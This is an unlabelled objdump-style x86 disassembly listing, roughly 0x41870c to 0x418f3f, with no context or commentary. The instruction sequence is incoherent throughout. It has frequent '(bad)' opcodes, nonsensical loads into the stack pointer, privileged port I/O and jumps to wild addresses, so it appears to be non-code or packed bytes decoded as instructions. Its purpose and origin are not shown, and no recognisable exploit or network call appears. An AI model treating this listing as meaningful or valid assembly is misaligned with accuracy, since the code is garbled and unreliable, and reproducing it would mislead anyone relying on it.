  41870c:	repz mov ecx,DWORD PTR [ebp-0x34]
  418710:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  418717:	je     0x418719
  418719:	or     DWORD PTR [ebx-0x74183b24],eax
  41871f:	jne    0x418705
  418721:	jmp    0x41871c
  418723:	push   DWORD PTR [edx-0x24]
  418726:	push   0x4d
  418728:	pop    ecx
  418729:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  41872d:	jge    0x418735
  41872f:	mov    eax,eax
  418731:	sub    ebp,DWORD PTR [edx+0x24]
  418734:	pop    esi
  418735:	inc    ebp
  418736:	mov    esp,0x8b6077
  41873b:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  418741:	lods   al,BYTE PTR ds:[esi]
  418742:	add    BYTE PTR [ebx],bh
  418744:	enter  0xce73,0x49
  418748:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  418750:	stc    
  418751:	jge    0x4187c5
  418753:	jnp    0xdd410ab4
  418759:	call   0xc4882f
  41875e:	fadd   st(0),st
  418760:	dec    esi
  418761:	ins    BYTE PTR es:[edi],dx
  418762:	stc    
  418763:	cmp    al,0x73
  418765:	push   ebp
  418766:	mov    eax,0xf8028b
  41876b:	jne    0x41872e
  41876d:	mov    esi,ecx
  41876f:	mov    esp,DWORD PTR [ebp+0x2c]
  418772:	add    edi,DWORD PTR [ebp-0x24]
  418775:	sub    esp,eax
  418777:	and    al,0x45
  418779:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  41877f:	sbb    al,0xee
  418781:	pop    esi
  418782:	call   0x8187b2
  418787:	fsubr  st,st(3)
  418789:	sti    
  41878a:	add    BYTE PTR gs:[ecx],bh
  41878d:	add    eax,esp
  41878f:	add    DWORD PTR [esi],eax
  418791:	rol    DWORD PTR [ebp+0x8],0x29
  418795:	mov    esp,eax
  418797:	clc    
  418798:	jne    0x41880f
  41879a:	mov    eax,0x8b0673
  41879f:	loopne 0x4187e6
  4187a1:	loopne 0x41872c
  4187a3:	lods   al,BYTE PTR ds:[esi]
  4187a4:	int3   
  4187a5:	inc    ebp
  4187a6:	mov    DWORD PTR gs:[eax+edi*8],eax
  4187aa:	add    al,0xc3
  4187ac:	sub    ecx,DWORD PTR [ebp+0x47]
  4187af:	(bad)  
  4187b1:	shr    BYTE PTR [ebp-0x1f],0xe8
  4187b5:	add    eax,DWORD PTR [eax]
  4187b7:	call   0x64348bc
  4187bc:	add    esi,DWORD PTR [esi-0x3b2efc83]
  4187c2:	dec    esi
  4187c3:	ins    DWORD PTR es:[edi],dx
  4187c4:	in     al,dx
  4187c5:	lea    eax,[eax]
  4187c7:	inc    ebp
  4187c8:	inc    ebp
  4187c9:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  4187cf:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  4187d9:	and    al,0xdc
  4187db:	ror    DWORD PTR [edx+0x24],0xf7
  4187df:	or     BYTE PTR [ebp+0x4c],dh
  4187e2:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  4187e6:	stos   BYTE PTR es:[edi],al
  4187e7:	adc    edx,edi
  4187e9:	inc    esp
  4187ea:	add    edi,DWORD PTR [eax]
  4187ec:	jne    0x4187d1
  4187ee:	mov    DWORD PTR [eax-0x7449db04],ecx
  4187f4:	cmp    ecx,DWORD PTR [edi]
  4187f6:	sub    BYTE PTR [ebp-0x7e],dl
  4187f9:	sar    ebp,0xb
  4187fc:	jmp    FWORD PTR [edi+0x2400392a]
  418802:	sub    esi,DWORD PTR [ebx-0x73]
  418805:	mov    esp,DWORD PTR [ecx+edi*4]
  418808:	mov    ecx,DWORD PTR [eax]
  41880a:	and    BYTE PTR [eax],al
  41880c:	jne    0x4187d8
  41880e:	sub    ebp,ecx
  418810:	sbb    BYTE PTR [esi+0x32],ah
  418813:	dec    ebp
  418814:	push   ebp
  418815:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  41881b:	ret    
  41881c:	mov    edx,ebp
  41881e:	leave  
  41881f:	sub    DWORD PTR [esi+0x24],ebx
  418822:	ret    0x2b
  418825:	pop    ax
  418827:	push   ebp
  418828:	rol    BYTE PTR [ebx],0xeb
  41882b:	add    DWORD PTR [ecx+0x6c0001],0x40
  418832:	jb     0x418889
  418834:	ret    
  418835:	in     al,dx
  418836:	jecxz  0x4187c3
  418838:	push   esi
  418839:	xchg   esp,eax
  41883a:	jne    0x41883c
  41883c:	cmp    edx,DWORD PTR [esi+0x1c]
  41883f:	jne    0x418825
  418841:	mov    eax,DWORD PTR [ebp-0x77]
  418844:	ror    DWORD PTR [ebx+0x899408],0xe0
  41884b:	mov    esi,DWORD PTR [ebp-0x75]
  41884e:	pop    esi
  41884f:	nop
  418850:	mov    eax,DWORD PTR [eax]
  418852:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  418858:	add    al,0x0
  41885a:	inc    ebp
  41885b:	mov    eax,DWORD PTR [ebx]
  41885d:	mov    ebp,ebx
  41885f:	cmp    al,0xf
  418861:	or     al,al
  418863:	inc    ebp
  418864:	inc    ebp
  418865:	xor    DWORD PTR [ebx+0x6c8bc89c],ecx
  41886b:	cld    
  41886c:	add    BYTE PTR [edi+0x556c16c0],dh
  418872:	add    BYTE PTR [ecx-0x5],dl
  418875:	add    eax,0x17200
  41887a:	sbb    al,0x85
  41887c:	dec    esp
  41887d:	je     0x4188b7
  41887f:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  418883:	add    BYTE PTR [ebx],bh
  418885:	(bad)  
  418886:	and    al,0x30
  418888:	jae    0x418826
  41888a:	mov    cl,cl
  41888c:	inc    DWORD PTR [esp]
  41888f:	push   ebp
  418890:	shr    esp,0x8
  418893:	in     al,dx
  418894:	push   esp
  418895:	add    DWORD PTR [eax],esp
  418897:	add    bl,cl
  418899:	inc    ebp
  41889a:	mov    bh,0x53
  41889c:	add    BYTE PTR [ebp-0x17],al
  41889f:	push   esi
  4188a0:	cmovne ecx,edx
  4188a3:	xor    BYTE PTR [esp+ebx*4+0x20],cl
  4188a7:	push   edi
  4188a8:	pop    ss
  4188a9:	xor    ecx,ebx
  4188ab:	pushf  
  4188ac:	add    BYTE PTR [ecx+0x452bf800],cl
  4188b2:	rcr    ecx,0x5
  4188b5:	inc    ebp
  4188b6:	add    esp,ebx
  4188b8:	add    BYTE PTR [ebp-0x40],al
  4188bb:	out    0x6c,eax
  4188bd:	inc    ebp
  4188be:	inc    eax
  4188bf:	sub    eax,0x450547c1
  4188c4:	dec    esp
  4188c5:	and    BYTE PTR cs:[ebp-0x27],al
  4188c9:	jo     0x4188f4
  4188cb:	leave  
  4188cc:	add    BYTE PTR [esi+0xc000c0],bh
  4188d2:	lea    eax,[esp-0x40]
  4188d6:	ret    
  4188d7:	mov    dh,0x8b
  4188d9:	xor    edx,DWORD PTR [ecx+0x3]
  4188dc:	mov    al,BYTE PTR [ecx+0x1]
  4188df:	sbb    BYTE PTR [eax],al
  4188e1:	stc    
  4188e2:	mov    esi,DWORD PTR [edx+0x8]
  4188e5:	(bad)  
  4188e6:	ss mov eax,0xb98ac631
  4188ec:	add    esi,eax
  4188ee:	add    BYTE PTR [edx-0x444d39f7],bh
  4188f4:	add    esi,eax
  4188f6:	add    BYTE PTR [esi+ecx*1+0x1bd82c6],bh
  4188fd:	mov    BYTE PTR [eax],0xbe
  418900:	or     BYTE PTR [ebx],dh
  418902:	dec    ecx
  418903:	lea    eax,[ebx]
  418905:	or     eax,0x18fc0fc7
  41890a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41890b:	(bad)  
  41890d:	fiadd  WORD PTR [ebp-0x78]
  418910:	jae    0xed76905f
  418916:	or     BYTE PTR [ebp+0x7],al
  418919:	in     eax,dx
  41891a:	pushf  
  41891b:	inc    ebp
  41891c:	xor    bl,al
  41891e:	pop    esi
  41891f:	inc    ebp
  418920:	shl    esp,0xc
  418923:	inc    ebp
  418924:	sub    cl,0x1
  418927:	inc    ebp
  418928:	add    bh,bl
  41892a:	add    BYTE PTR [ebp-0x7b],al
  41892d:	loopne 0x418927
  41892f:	inc    ebp
  418930:	ret    0xe7
  418933:	inc    ebp
  418934:	mov    esi,DWORD PTR [eax-0x7f]
  418937:	leave  
  418938:	and    al,0x44
  41893a:	add    BYTE PTR [eax+0x331cb68b],dh
  418940:	mov    DWORD PTR [ebx],eax
  418942:	sbb    al,0x41
  418944:	(bad)  
  418945:	sbb    al,ah
  418947:	stc    
  418948:	test   DWORD PTR [edx-0x8],esi
  41894b:	lea    edi,[edi-0x7007a98]
  418951:	mov    DWORD PTR [ebp-0x2c],edi
  418954:	(bad)  
  418955:	dec    ebp
  418956:	sar    BYTE PTR [eax+0x71c1fcc6],0xc6
  41895d:	add    edx,eax
  41895f:	(bad)  
  418960:	(bad)  
  418961:	inc    ebx
  418963:	jmp    FWORD PTR [edx-0x38]
  418966:	(bad)  
  418967:	or     al,ah
  418969:	jge    0x418931
  41896b:	mov    ebp,0x5a8533e4
  418971:	clc    
  418972:	leave  
  418973:	inc    ebp
  418974:	add    BYTE PTR [ebx+0xd8c8d],cl
  41897a:	rdpmc  
  41897c:	sbb    BYTE PTR [edi+0x7de08da],bh
  418982:	mov    BYTE PTR [ebx+eax*4-0x12c6f9ce],bl
  418989:	cmovne edx,ebx
  41898c:	jmp    0x41898e
  41898e:	inc    ebp
  41898f:	mov    ebp,ebp
  418991:	sbb    al,0x45
  418993:	mov    ebx,ebx
  418995:	add    DWORD PTR [ebp+0x0],eax
  418998:	out    dx,al
  418999:	add    DWORD PTR [ebp+0x4d],eax
  41899c:	sub    eax,0x2e80458b
  4189a1:	add    BYTE PTR [ebp-0x77],al
  4189a4:	jo     0x418a10
  4189a6:	leave  
  4189a7:	mov    DWORD PTR [esp+ecx*8-0x48],0x33e9b6d8
  4189af:	inc    ebp
  4189b0:	add    ebx,edi
  4189b2:	inc    ecx
  4189b3:	out    0x18,eax
  4189b5:	(bad)  
  4189b6:	stc    
  4189b7:	int3   
  4189b8:	jb     0x418944
  4189ba:	(bad)  
  4189bb:	xor    dh,BYTE PTR [eax-0x4ec83980]
  4189c1:	or     dh,al
  4189c3:	dec    esi
  4189c4:	mov    dl,0xf3
  4189c6:	mov    BYTE PTR [ebp-0x4d],0x89
  4189ca:	(bad)  
  4189cb:	loopne 0x418981
  4189cd:	inc    esi
  4189cf:	lea    esi,[ebp-0x49003924]
  4189d5:	push   eax
  4189d6:	mov    BYTE PTR [ebp-0x49],0x33
  4189da:	xor    eax,DWORD PTR [ebx]
  4189dc:	lea    edx,[eax+0xd]
  4189df:	inc    ebp
  4189e0:	jae    0x8c1beffe
  4189e6:	ficomp WORD PTR [eax+ecx*4]
  4189e9:	add    BYTE PTR [ebx-0x12fff7ff],0x85
  4189f0:	test   esi,edi
  4189f2:	(bad)  
  4189f3:	(bad)  
  4189f4:	inc    DWORD PTR [eax]
  4189f6:	inc    ebp
  4189f7:	add    BYTE PTR [ebx-0x10aa2bd0],cl
  4189fd:	test   DWORD PTR [ebx],edx
  4189ff:	jne    0x41898a
  418a01:	or     DWORD PTR [ebx-0xed9771],0x75703b8c
  418a0b:	jmp    0x1258a99
  418a10:	inc    ebp
  418a11:	jne    0x4189f5
  418a13:	mov    DWORD PTR [eax+eiz*8+0x331cff8b],ebx
  418a1a:	mov    BYTE PTR [ebp+0x45009c01],cl
  418a20:	shl    BYTE PTR [eax],0x55
  418a23:	push   cx
  418a25:	mov    bx,0x7245
  418a29:	gs add bh,al
  418a2c:	add    DWORD PTR [ebp+eax*4+0xd801df],ebx
  418a33:	inc    ebp
  418a34:	dec    ebp
  418a35:	into   
  418a36:	mov    esp,ebx
  418a38:	jl     0x418a01
  418a3a:	add    BYTE PTR [ecx+ecx*4+0x1ce48bdb],ah
  418a41:	inc    ebp
  418a42:	mov    edi,ebx
  418a44:	add    ebp,esp
  418a46:	add    BYTE PTR [esi+0x1],ah
  418a49:	inc    ebp
  418a4a:	or     BYTE PTR [edi],bh
  418a4c:	inc    ebp
  418a4d:	(bad)  
  418a4e:	in     eax,dx
  418a4f:	fsubr  st(4),st
  418a51:	inc    edi
  418a53:	add    dl,al
  418a55:	add    al,ah
  418a57:	call   0x86a2cc
  418a5c:	pop    esi
  418a5d:	test   DWORD PTR [eax],ecx
  418a5f:	dec    dl
  418a61:	(bad)  
  418a62:	jmp    0x414012ec
  418a67:	push   DWORD PTR [ebp-0x75]
  418a6a:	(bad)  
  418a6b:	loopne 0x418a39
  418a6d:	mov    DWORD PTR [ebp-0x74013d],0xfec0851c
  418a77:	push   eax
  418a78:	inc    DWORD PTR [ebp-0x75]
  418a7b:	mov    esp,eax
  418a7d:	cwde   
  418a7e:	mov    DWORD PTR [eax],0xff8bffc3
  418a84:	sbb    al,0x8
  418a86:	ror    BYTE PTR [ebp+0x50],0x51
  418a8a:	inc    ebp
  418a8b:	ror    BYTE PTR [ebx+0x65987d],1
  418a91:	test   edi,eax
  418a93:	add    al,0xdc
  418a95:	add    bh,bh
  418a97:	push   0x1
  418a99:	add    BYTE PTR [eax],al
  418a9b:	mov    edi,edi
  418a9d:	inc    WORD PTR [ebp+0x8]
  418aa1:	add    eax,0xd
  418aa4:	(bad)  
  418aa6:	xor    eax,0x782ec89
  418aab:	push   ecx
  418aac:	cli    
  418aad:	popw   es
  418aaf:	push   ebp
  418ab0:	xchg   BYTE PTR [ebx-0x76740800],al
  418ab6:	sbb    al,0x86
  418ab8:	test   DWORD PTR [ecx-0x2],edx
  418abb:	call   WORD PTR [ebp-0x40]
  418abf:	adc    DWORD PTR [ebp-0x5],0xffffffc7
  418ac3:	mov    eax,ebx
  418ac5:	mov    dh,BYTE PTR ds:0xc7666851
  418acb:	push   ebp
  418acc:	fsub   QWORD PTR [esi+0x0]
  418acf:	dec    ebp
  418ad0:	inc    ebp
  418ad1:	mov    edx,0xec4ec0
  418ad6:	(bad)  
  418ad7:	retf   0x89a0
  418ada:	fist   DWORD PTR [eax+0x454ae1]
  418ae0:	jmp    0xa8b5:0xc7663e8b
  418ae7:	jmp    edx
  418ae9:	(bad)  
  418aea:	in     eax,dx
  418aeb:	lock (bad) 
  418aed:	mov    DWORD PTR [esi+ebp*2-0x727a0090],ebp
  418af4:	(bad)  
  418af5:	xor    eax,0x700089ff
  418afa:	add    bh,bh
  418afc:	stos   DWORD PTR es:[edi],eax
  418afd:	data16 add BYTE PTR [ebp-0x1b0077],al
  418b04:	inc    DWORD PTR [ecx-0x73]
  418b07:	data16 fadd QWORD PTR [ebp-0xaf0001]
  418b0e:	inc    ebp
  418b0f:	shl    BYTE PTR [ebx],0x66
  418b12:	add    eax,DWORD PTR [ebp-0xba00b0]
  418b18:	add    DWORD PTR [ecx+0x44],0x66
  418b1c:	mov    eax,DWORD PTR [ebp-0x7f00e4]
  418b22:	add    DWORD PTR [ecx-0xcf8600],ecx
  418b28:	push   ebp
  418b29:	lea    dx,[ebp-0x28]
  418b30:	add    BYTE PTR [ebp-0x25],0xf
  418b34:	jge    0xff428a3b
  418b3a:	mov    ecx,0xc34fc7
  418b3f:	rol    ecx,0x89
  418b42:	mov    DWORD PTR [eax+eax*4-0x1],ebp
  418b46:	ror    BYTE PTR [ebx-0x48990775],0x55
  418b4d:	or     BYTE PTR [ebp-0x763c0a39],0xc1
  418b54:	test   BYTE PTR [ecx-0x3f997f3e],cl
  418b5a:	push   ebp
  418b5b:	mov    DWORD PTR [ebp-0x76761480],ecx
  418b61:	or     BYTE PTR [eax+0x6600c265],0x45
  418b68:	push   ebp
  418b69:	xor    DWORD PTR [ebp-0x76381e64],ecx
  418b6f:	aam    0x8c
  418b71:	test   DWORD PTR [ecx-0x3dba7108],ecx
  418b77:	cmp    eax,0xc78b9c00
  418b7c:	data16 hlt 
  418b7e:	dec    ebp
  418b7f:	test   DWORD PTR [ecx+0x454ff8],edi
  418b85:	xor    ecx,esi
  418b87:	lahf   
  418b88:	mov    DWORD PTR [ebx-0x7f00e394],ecx
  418b8e:	mov    eax,DWORD PTR [ecx]
  418b90:	data16 add BYTE PTR [ebp-0x7400bb],dh
  418b97:	sbb    al,0x71
  418b99:	dec    ebp
  418b9a:	mov    si,WORD PTR [ebp-0xff0074]
  418ba1:	mov    ecx,DWORD PTR [ecx-0x6f8d75]
  418ba7:	add    BYTE PTR [ebp-0x760fd477],cl
  418bad:	jne    0x418c23
  418baf:	test   edi,edi
  418bb1:	jne    0x418b36
  418bb3:	(bad)  
  418bb4:	sti    
  418bb5:	sbb    BYTE PTR [ecx-0x1789ab],cl
  418bbb:	cld    
  418bbc:	(bad)  
  418bbd:	jmp    DWORD PTR [ecx]
  418bbf:	inc    ebp
  418bc0:	mov    DWORD PTR [ebx+0x3ff8b78],ecx
  418bc6:	data16 cmp al,0x8d
  418bc9:	push   cs
  418bca:	inc    DWORD PTR [ebp-0x1]
  418bcd:	test   DWORD PTR [ecx-0x838c],ecx
  418bd3:	sbb    al,0x8b
  418bd5:	lock clc 
  418bd7:	push   DWORD PTR [edi-0xe39375]
  418bdd:	xor    BYTE PTR [ebx],0x1
  418be0:	add    eax,DWORD PTR [eax]
  418be2:	xor    eax,DWORD PTR [eax]
  418be4:	mov    WORD PTR [ebp-0xba003d],0x4575
  418bed:	mov    ecx,DWORD PTR [edi]
  418bef:	sbb    al,0x4d
  418bf1:	mov    DWORD PTR [ebx],esi
  418bf3:	add    DWORD PTR [ebx],eax
  418bf5:	add    BYTE PTR [ebx],dh
  418bf7:	xor    DWORD PTR [esi-0x80],esp
  418bfa:	inc    ebp
  418bfb:	add    DWORD PTR [ebx],esi
  418bfd:	add    BYTE PTR [esi+0x50],ah
  418c00:	inc    ebp
  418c01:	jmp    0x868e6c
  418c06:	add    DWORD PTR [eax+0xc70194],0xffffffec
  418c0d:	or     BYTE PTR [ebp+0x4501f845],dh
  418c13:	jmp    0xdd8f09
  418c18:	(bad)  
  418c19:	push   cs
  418c1a:	in     al,0xc9
  418c1c:	test   DWORD PTR [ebp+0x4502f8],eax
  418c22:	xor    ecx,DWORD PTR [ebp-0x64]
  418c25:	mov    eax,edi
  418c27:	mov    esp,esp
  418c29:	push   eax
  418c2a:	add    eax,0x45fff885
  418c2f:	dec    DWORD PTR [ebx+0x339445]
  418c35:	add    ecx,DWORD PTR [ecx+0x452ce889]
  418c3b:	dec    DWORD PTR [ebx-0x4e0be375]
  418c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c42:	add    edi,edi
  418c44:	add    bh,bh
  418c46:	push   cs
  418c47:	xor    eax,DWORD PTR [eax+0x890103]
  418c4d:	xor    BYTE PTR [ebp-0x1],al
  418c50:	mov    DWORD PTR [ebp-0x36df38],ecx
  418c56:	push   cs
  418c57:	push   eax
  418c58:	jne    0x418c9f
  418c5a:	mov    esi,DWORD PTR [ebx]
  418c5c:	sbb    al,0x3
  418c5e:	jne    0x418cb0
  418c60:	inc    DWORD PTR [ebp-0x75]
  418c63:	add    eax,0x800f0
  418c68:	add    BYTE PTR [ebx-0x7f74e3bf],cl
  418c6e:	mov    DWORD PTR [ecx],eax
  418c70:	sbb    BYTE PTR [eax],al
  418c72:	leave  
  418c73:	test   DWORD PTR [edi-0x1],eax
  418c76:	jne    0x418c77
  418c78:	call   0xff42777d
  418c7d:	xor    BYTE PTR [ebp+0x4d],al
  418c80:	mov    edi,edi
  418c82:	enter  0x8,0x4d
  418c86:	mov    ecx,DWORD PTR [ebx-0x17fc74cd]
  418c8c:	mov    eax,DWORD PTR [eax]
  418c8e:	sbb    al,0x1
  418c90:	sbb    DWORD PTR [ebp+0x4d],eax
  418c93:	mov    DWORD PTR [ebx+0x18cc8b],ecx
  418c99:	inc    eax
  418c9a:	dec    DWORD PTR [ecx-0x27d775]
  418ca0:	add    BYTE PTR [ebx-0x38d72b01],cl
  418ca6:	xchg   ecx,eax
  418ca7:	ret    
  418ca8:	add    BYTE PTR [ebp-0x830075],al
  418cae:	add    BYTE PTR [ebp-0x75],al
  418cb1:	mov    DWORD PTR [ebp+0x8ff0430],ecx
  418cb7:	lea    edi,[edi+0x20]
  418cba:	add    bh,bh
  418cbc:	mov    edx,DWORD PTR [eax-0x7b]
  418cbf:	inc    ebp
  418cc0:	rdpmc  
  418cc2:	jne    0x418cc7
  418cc4:	add    BYTE PTR [eax-0x75],dl
  418cc7:	inc    ebp
  418cc8:	call   0x404195d2
  418ccd:	add    BYTE PTR [ecx-0xe3d775],cl
  418cd3:	or     BYTE PTR [ebx-0x38ff13ff],0x85
  418cda:	ret    
  418cdb:	inc    DWORD PTR [ebp-0xff0001]
  418ce1:	add    BYTE PTR [ebp-0x4b],al
  418ce4:	cmp    edi,0x24
  418ce7:	(bad)  
  418ce8:	push   DWORD PTR [eax]
  418cea:	add    BYTE PTR [ebp-0x39],dl
  418ced:	test   ebx,eax
  418cef:	je     0x418c76
  418cf1:	mov    edi,edi
  418cf3:	sbb    bh,bh
  418cf5:	test   DWORD PTR gs:[eax],eax
  418cf8:	(bad)  
  418cf9:	js     0x418cfa
  418cfb:	add    BYTE PTR [ebx-0x38b21fdd],cl
  418d01:	sub    eax,ebx
  418d03:	mov    ecx,DWORD PTR [ebx-0x5513e377]
  418d09:	add    eax,DWORD PTR [eax]
  418d0b:	dec    ebp
  418d0c:	push   eax
  418d0d:	mov    al,BYTE PTR [ebp+0x1]
  418d10:	mov    eax,DWORD PTR [ebp-0x68]
  418d13:	mov    eax,DWORD PTR [eax]
  418d15:	cld    
  418d16:	(bad)  
  418d17:	or     BYTE PTR [eax],ah
  418d19:	dec    ebp
  418d1a:	inc    DWORD PTR [eax+0x4]
  418d1d:	push   ecx
  418d1e:	add    BYTE PTR [edx-0x1],dh
  418d21:	mov    ecx,DWORD PTR [ecx+0x55cef83c]
  418d27:	or     DWORD PTR [ebx-0xfff3800],0x8b5545d6
  418d31:	add    ecx,DWORD PTR [ecx-0xf037477]
  418d37:	push   ecx
  418d38:	xor    BYTE PTR [ebx],al
  418d3a:	inc    ebp
  418d3b:	mov    DWORD PTR [ebx-0x7aaaafe8],ecx
  418d41:	(bad)  
  418d42:	push   eax
  418d44:	inc    DWORD PTR [eax]
  418d46:	inc    ebp
  418d47:	add    BYTE PTR [ebx],dh
  418d49:	add    BYTE PTR [ebx],0x0
  418d4c:	mov    DWORD PTR [ebx-0x150007d4],eax
  418d52:	lea    edx,[ebp-0x6c]
  418d55:	je     0x418cdc
  418d57:	(bad)  
  418d58:	dec    DWORD PTR [eax]
  418d5a:	call   DWORD PTR [ebp-0x7b]
  418d5d:	mov    edi,edi
  418d5f:	hlt    
  418d60:	call   DWORD PTR [ebp-0x75]
  418d63:	mov    esp,eax
  418d65:	cwde   
  418d66:	(bad)  
  418d67:	mov    bh,0xc3
  418d69:	mov    DWORD PTR [ebx-0x1100e39c],ecx
  418d6f:	add    DWORD PTR [eax],0x450050ff
  418d75:	mov    DWORD PTR [ebx+0x9598c8],ecx
  418d7b:	inc    edi
  418d7d:	jmp    DWORD PTR [eax]
  418d7f:	jmp    0xcd00:0x640481ff
  418d86:	mov    DWORD PTR [ebx],esi
  418d88:	and    al,0x81
  418d8a:	push   DWORD PTR [edx]
  418d8c:	call   FWORD PTR [edi+edi*8-0x3f74f78b]
  418d93:	add    esi,DWORD PTR [eax]
  418d95:	enter  0x3c45,0x83
  418d99:	add    ah,bh
  418d9b:	adc    DWORD PTR [ebx+0x768b5055],eax
  418da1:	add    ecx,DWORD PTR [ebx-0x31ba07cf]
  418da7:	mov    esi,eax
  418da9:	xor    BYTE PTR [ebp+0x45],cl
  418dac:	jmp    0x418d39
  418dae:	mov    ebx,DWORD PTR [eax]
  418db0:	in     al,dx
  418db1:	inc    ebp
  418db2:	or     al,0x2
  418db4:	dec    DWORD PTR [ebp-0x4]
  418db7:	jne    0x418e0e
  418db9:	mov    ecx,DWORD PTR [eax+0x18558be8]
  418dbf:	mov    edi,DWORD PTR [ebx]
  418dc1:	lock push eax
  418dc3:	xchg   ecx,eax
  418dc4:	jmp    0x341dbc9
  418dc9:	adc    al,0x8b
  418dcb:	inc    ebp
  418dcc:	mov    al,ds:0x8b04008b
  418dd1:	push   ebp
  418dd2:	sub    ecx,DWORD PTR [ecx-0x2d391308]
  418dd8:	push   ebp
  418dd9:	test   DWORD PTR [ebx-0x2900d701],ecx
  418ddf:	inc    ebp
  418de0:	dec    ebp
  418de1:	mov    DWORD PTR [ecx+0x45ffe424],ecx
  418de7:	mov    DWORD PTR [eax],0xe9ff0020
  418ded:	add    al,0x0
  418def:	add    BYTE PTR [eax],al
  418df1:	mov    eax,edx
  418df3:	push   eax
  418df4:	rol    DWORD PTR [ebp-0xb0077],1
  418dfa:	bound  eax,QWORD PTR [ebp+0x50]
  418dfd:	xor    ecx,DWORD PTR [ecx+0x55899803]
  418e03:	sub    al,0x89
  418e05:	push   esp
  418e07:	lea    edx,[ebp-0x6c]
  418e0a:	jne    0xffd78d22
  418e10:	inc    DWORD PTR [ebp-0x1d0001]
  418e16:	jnp    0xc7976e1c
  418e1c:	mov    eax,ebx
  418e1e:	fs mov edi,edi
  418e21:	sbb    al,0xc1
  418e23:	out    dx,al
  418e24:	or     al,0x0
  418e26:	ret    0x8d50
  418e29:	inc    ebp
  418e2a:	dec    DWORD PTR [ebx+0xfa98d7]
  418e30:	test   edi,edi
  418e32:	clc    
  418e33:	call   FWORD PTR [edi]
  418e35:	or     BYTE PTR [eax],cl
  418e37:	inc    ebp
  418e38:	dec    ebp
  418e39:	inc    DWORD PTR [ebx+0x74803114]
  418e3f:	add    DWORD PTR [ebx+0x45fc00],ecx
  418e45:	call   DWORD PTR [eax+edx*1]
  418e48:	add    ecx,DWORD PTR [ebp-0x38]
  418e4b:	push   esi
  418e4c:	adc    al,0x8
  418e4e:	mov    edx,DWORD PTR [ebp-0x14]
  418e51:	mov    ecx,DWORD PTR [ebp-0x4]
  418e54:	add    DWORD PTR [ebp-0x68],0xffffff8d
  418e58:	inc    DWORD PTR [esp+esi*8]
  418e5b:	inc    ebp
  418e5c:	stos   BYTE PTR es:[edi],al
  418e5d:	mov    edx,DWORD PTR [ebp+0x1c]
  418e60:	add    DWORD PTR [ebp-0x10],eax
  418e63:	mov    edx,DWORD PTR [ebp-0x70]
  418e66:	cmp    eax,DWORD PTR [eax]
  418e68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e69:	mov    eax,DWORD PTR [eax]
  418e6b:	sbb    al,0x73
  418e6d:	add    BYTE PTR [ebx],0x1
  418e70:	call   0x8971de75
  418e75:	xor    eax,ebp
  418e77:	pop    ds
  418e78:	inc    ebp
  418e79:	xor    al,BYTE PTR [ebp+0x6f760f3a]
  418e7f:	(bad)  
  418e80:	push   DWORD PTR [edi]
  418e82:	mov    ecx,DWORD PTR [ebx+0x398503f8]
  418e88:	push   DWORD PTR [ebx-0x1]
  418e8b:	mov    eax,DWORD PTR [ebp-0x740075]
  418e91:	sub    eax,DWORD PTR [eax]
  418e93:	add    eax,DWORD PTR [eax]
  418e95:	mov    DWORD PTR [ecx+0x5f],eax
  418e98:	mov    DWORD PTR [ebx+0x28],ebx
  418e9b:	ret    0xff
  418e9e:	mov    ecx,DWORD PTR [ebx+0x1cc783d4]
  418ea4:	ret    
  418ea5:	mov    eax,DWORD PTR [ebp-0x6f0075]
  418eab:	add    BYTE PTR [ebp-0x7d],al
  418eae:	mov    DWORD PTR [eax],eax
  418eb0:	xor    BYTE PTR [edi+edi*8+0x20008d01],al
  418eb7:	sar    bh,cl
  418eb9:	test   BYTE PTR [eax+0x1],dl
  418ebc:	inc    ebp
  418ebd:	add    BYTE PTR [ebx],dh
  418ebf:	test   BYTE PTR [ebx],0x84
  418ec2:	push   eax
  418ec3:	add    BYTE PTR [ebp+0x0],al
  418ec6:	add    eax,0x86
  418ecb:	add    BYTE PTR [ebx-0x7f7be340],cl
  418ed1:	add    BYTE PTR [ecx],al
  418ed3:	add    BYTE PTR [eax],al
  418ed5:	mov    esi,0x550030
  418eda:	mov    ecx,DWORD PTR [edi]
  418edc:	sbb    al,0xda
  418ede:	jne    0x418ee0
  418ee0:	mov    edi,DWORD PTR [ecx]
  418ee2:	xor    BYTE PTR [eax+eax*1],0x84
  418ee6:	add    eax,DWORD PTR [eax]
  418ee8:	cld    
  418ee9:	add    BYTE PTR [ebp-0x4f],dh
  418eec:	mov    eax,DWORD PTR [ecx]
  418eee:	cld    
  418eef:	add    BYTE PTR [ecx-0x1bff009b],cl
  418ef5:	retf   0xe45
  418ef8:	add    eax,edx
  418efa:	sbb    al,0xb7
  418efc:	dec    ebp
  418efd:	or     al,0x89
  418eff:	dec    ebp
  418f00:	sbb    al,0xf
  418f02:	inc    ebp
  418f03:	dec    eax
  418f04:	mov    eax,DWORD PTR [ebx]
  418f06:	sbb    al,0xf
  418f08:	nop
  418f09:	scas   al,BYTE PTR es:[edi]
  418f0a:	add    DWORD PTR [eax],eax
  418f0c:	add    BYTE PTR [ebp-0x7674ebbb],cl
  418f12:	mov    eax,gs
  418f14:	add    bh,bh
  418f16:	mov    edi,edi
  418f18:	cmp    DWORD PTR [edi+0x72],edx
  418f1b:	xor    DWORD PTR [ebx-0x74ee7481],ecx
  418f21:	gs cmp al,0x0
  418f24:	je     0x418efc
  418f26:	push   eax
  418f27:	sar    BYTE PTR [eax],1
  418f29:	mov    bh,0x3e
  418f2b:	push   cs
  418f2c:	cmp    DWORD PTR [edi-0x4cff3f4],esi
  418f32:	add    DWORD PTR [ecx+0x12],ebp
  418f35:	dec    edx
  418f36:	(bad)  
  418f37:	mov    eax,edx
  418f39:	in     al,dx
  418f3a:	adc    DWORD PTR [ecx],esi
  418f3c:	pop    esi
  418f3d:	inc    ecx
  418f3e:	leave  
  418f3f:	or     DWORD PTR [eax],ebx
